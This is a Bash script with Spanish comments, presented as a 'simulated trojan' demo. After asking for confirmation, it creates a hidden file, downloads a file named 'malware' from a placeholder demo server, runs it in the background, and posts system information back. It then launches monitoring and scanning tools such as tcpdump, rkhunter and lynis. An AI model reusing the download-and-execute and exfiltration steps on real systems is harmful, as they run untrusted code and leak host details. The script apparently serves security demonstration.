#!/bin/bash

# Configuración
LOG_FILE="$HOME/troyano_simulado.log"
SERVER_URL="http://tuservidordemo.com"  # Reemplaza con un servidor de prueba controlado
INTERVALO_MONITOREO_RED=60  # Intervalo de monitoreo de red en segundos
INTERVALO_MONITOREO_PROCESOS=60  # Intervalo de monitoreo de procesos en segundos
INTERVALO_MONITOREO_REGISTROS=3600  # Intervalo de monitoreo de registros en segundos
INTERVALO_MONITOREO_PUERTOS=60  # Intervalo de monitoreo de puertos abiertos en segundos
INTERVALO_MONITOREO_USUARIOS=3600  # Intervalo de monitoreo de usuarios y grupos en segundos

# Función para registrar mensajes
log_message() {
  local message="$1"
  echo "$(date +'%Y-%m-%d %H:%M:%S') - $message" >> "$LOG_FILE"
}

# Confirmar con el usuario antes de proceder (mantener por seguridad en la demo)
read -p "¿Deseas proceder con la ejecución del script? (s/n): " confirm
if [[ ! "$confirm" =~ ^[sS]$ ]]; then
  log_message "Ejecución cancelada por el usuario."
  exit 0
fi

# Verificar conectividad a Internet
if ! ping -c 1 google.com &> /dev/null; then
  log_message "Error: No se puede conectar a Internet."
  exit 1
fi

# Verificar que el directorio personal existe
if [ ! -d "$HOME" ]; then
  log_message "Error: El directorio personal no existe."
  exit 1
fi

# Verificar que los comandos necesarios están disponibles
for cmd in curl date uname; do
  if ! command -v "$cmd" &> /dev/null; then
    log_message "Error: El comando $cmd no está instalado."
    exit 1
  fi
done

# Crear un archivo oculto en el directorio personal del usuario
log_message "Creando archivo oculto en el directorio personal..."
file_path="$HOME/.secreto_$(date +%F_%T).txt"
if echo "Este es un archivo secreto" > "$file_path"; then
  chmod 600 "$file_path"  # Establecer permisos para que sólo el propietario pueda leer y escribir
  log_message "Archivo oculto creado en $file_path."
else
  log_message "Error al crear el archivo oculto."
  exit 1
fi

# Descargar un archivo desde un servidor remoto
log_message "Descargando un archivo desde un servidor remoto..."
file_name="descargado_$(date +%F_%T).sh"  # Puede ser un script malicioso o similar
if curl -o "$HOME/$file_name" -s -f "$SERVER_URL/malware"; then
  log_message "Archivo descargado correctamente."
  
  # Ejecutar el archivo descargado (simulando comportamiento malicioso)
  chmod +x "$HOME/$file_name"
  "$HOME/$file_name" &
  log_message "Archivo ejecutado: $file_name."
else
  log_message "Error al descargar el archivo."
  exit 1
fi

# Enviar un mensaje a un servidor remoto con información del sistema
log_message "Enviando información del sistema..."
system_info=$(uname -a)
response=$(echo "$system_info" | curl -X POST -d @- -s -w "%{http_code}" -o /dev/null "$SERVER_URL/registro")
if [ "$response" -eq 200 ]; then
  log_message "Información del sistema enviada correctamente."
else
  log_message "Error al enviar la información del sistema."
  exit 1
fi

# Mostrar un mensaje al usuario
log_message "Todo ha sido realizado con éxito."
echo "Todo ha sido realizado con éxito."

# Enviar notificación por correo electrónico
log_message "Enviando notificación por correo electrónico..."
if echo "Todo ha sido realizado con éxito." | mail -s "Notificación de script" tu_correo@example.com; then
  log_message "Notificación enviada correctamente."
else
  log_message "Error al enviar la notificación."
fi

# Implementaciones de seguridad y detección
log_message "Iniciando monitoreo de red..."
tcpdump -i any -w ~/network_traffic.pcap &

log_message "Iniciando análisis de archivos..."
clamdscan -i ~/descargado_* &

log_message "Iniciando monitoreo de procesos..."
while true; do
  ps -ef | grep "malware" >> "$LOG_FILE"
  sleep $INTERVALO_MONITOREO_PROCESOS
done &

log_message "Iniciando monitoreo de registros..."
while true; do
  logwatch --range 'today' --detail 'high' >> "$LOG_FILE"
  sleep $INTERVALO_MONITOREO_REGISTROS
done &

log_message "Iniciando análisis de sistema..."
rkhunter --check --sk >> "$LOG_FILE" &

log_message "Iniciando monitoreo de integridad de archivos..."
aide --check >> "$LOG_FILE" &

log_message "Iniciando monitoreo de puertos abiertos..."
while true; do
  netstat -tlnp | grep "LISTEN" >> "$LOG_FILE"
  sleep $INTERVALO_MONITOREO_PUERTOS
done &

log_message "Iniciando monitoreo de usuarios y grupos..."
while true; do
  pwck >> "$LOG_FILE"
  sleep $INTERVALO_MONITOREO_USUARIOS
done &

log_message "Iniciando monitoreo de configuración de seguridad..."
lynis --quick >> "$LOG_FILE" &

log_message "Finalizando script..."
exit 0
